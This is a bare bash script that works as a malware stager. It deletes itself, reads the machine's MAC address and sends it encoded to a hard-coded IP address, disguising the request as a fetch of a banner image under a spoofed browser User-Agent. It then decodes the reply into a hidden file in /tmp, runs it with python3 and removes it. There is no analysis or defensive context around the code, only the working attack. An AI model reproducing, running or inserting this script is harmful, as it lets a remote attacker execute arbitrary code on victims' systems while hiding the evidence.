#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')

curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg
python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg